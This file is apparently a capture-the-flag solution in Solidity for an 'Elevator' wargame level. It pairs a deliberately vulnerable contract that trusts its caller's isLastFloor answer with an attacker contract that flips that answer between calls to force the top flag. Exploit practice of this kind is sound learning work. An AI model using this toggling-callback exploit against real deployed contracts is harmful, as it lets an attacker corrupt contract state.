pragma solidity ^0.8.0;
//address: 0xbd6B914A3090B96a5d0eedFE3b1f895C233ba2e2
interface Building {
    function isLastFloor(uint) external returns (bool);
}


contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);//EOA怎么可能使用接口生成实例呢，是吧

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
//Attack_Elevator deployed to: 0xc677dbbeF1e3B4AD384Bc073836e8610a2384eDF
contract Attack_Elevator {
    Elevator public target;
    bool public toggle = true;

    constructor(address _target) {
        target = Elevator(_target);
    }


    function isLastFloor(uint) public returns (bool){
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _floor) public{
        target.goTo(_floor);
    }
}